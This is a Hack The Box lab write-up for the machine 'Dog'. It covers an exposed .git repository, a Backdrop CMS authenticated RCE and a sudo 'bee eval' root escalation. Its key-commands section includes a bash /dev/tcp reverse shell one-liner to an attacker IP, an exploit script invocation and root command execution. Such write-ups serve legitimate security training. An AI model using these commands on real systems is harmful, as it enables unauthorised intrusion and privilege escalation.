---
title: HTB Dog
slug: dog
lang: en
platform: Hack The Box
category: CMS Exploitation
headline: Exposed Git repository, Backdrop CMS RCE and sudo Bee PHP eval abuse
difficulty: Retired
objective: Root / Administrator
date: 2025-12-03
tags: [Linux, Backdrop CMS, Git Disclosure, RCE, sudo]
---

# HTB Dog

## Executive Summary

Dog exposes a Backdrop CMS installation with a publicly reachable `.git` directory. Dumping the repository reveals database credentials, which are reused to access the CMS as a valid user.

## Initial Access

A Backdrop authenticated RCE path is used to install or execute a malicious module and obtain a web shell. From there, a reverse shell gives interactive access as the web user.

## User Pivot

Local enumeration reveals valid system users. Password reuse allows SSH access as `johncusack`.

## Privilege Escalation

`sudo -l` allows running the Backdrop `bee` CLI as root. From the Backdrop root, `bee eval` executes arbitrary PHP, which can either read `/root/root.txt` or spawn a root shell.

## Key Commands

```bash
git-dumper http://10.129.231.223/.git/ WebSite
```

```bash
grep -irE "@dog.htb" WebSite
```

```bash
python3 exploit.py http://10.129.231.223 tiffany <redacted-password>
```

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.3/4444 0>&1"
```

```bash
sudo /usr/local/bin/bee eval "system('id')"
```

```bash
sudo /usr/local/bin/bee eval "system('cat /root/root.txt')"
```

## Evidence Trail

The following screenshots preserve the original lab evidence sequence from the Obsidian notes.

![[Pasted image 20251203203846.png|dog evidence 01]]

![[Pasted image 20251203203931.png|dog evidence 02]]

![[Pasted image 20251203204024.png|dog evidence 03]]

![[Pasted image 20251203204230.png|dog evidence 04]]

![[Pasted image 20251203211925.png|dog evidence 05]]

![[Pasted image 20251203213530.png|dog evidence 06]]

![[Pasted image 20251203213703.png|dog evidence 07]]

![[Pasted image 20251203214232.png|dog evidence 08]]

![[Pasted image 20251203214242.png|dog evidence 09]]

![[Pasted image 20251203214320.png|dog evidence 10]]

![[Pasted image 20251203214428.png|dog evidence 11]]

![[Pasted image 20251203214903.png|dog evidence 12]]

![[Pasted image 20251203215658.png|dog evidence 13]]

![[Pasted image 20251203215952.png|dog evidence 14]]

![[Pasted image 20251203220144.png|dog evidence 15]]

![[Pasted image 20251203220358.png|dog evidence 16]]

![[Pasted image 20251203220458.png|dog evidence 17]]

![[Pasted image 20251203220525.png|dog evidence 18]]

![[Pasted image 20251203220543.png|dog evidence 19]]

![[Pasted image 20251203222610.png|dog evidence 20]]

![[Pasted image 20251203222931.png|dog evidence 21]]

![[Pasted image 20251203223213.png|dog evidence 22]]

![[Pasted image 20251203223228.png|dog evidence 23]]

![[Pasted image 20251203223439.png|dog evidence 24]]

![[Pasted image 20251203223608.png|dog evidence 25]]

![[Pasted image 20251203223829.png|dog evidence 26]]

![[Pasted image 20251203224240.png|dog evidence 27]]

![[Pasted image 20251203230358.png|dog evidence 28]]

![[Pasted image 20251203230715.png|dog evidence 29]]

![[Pasted image 20251203231421.png|dog evidence 30]]
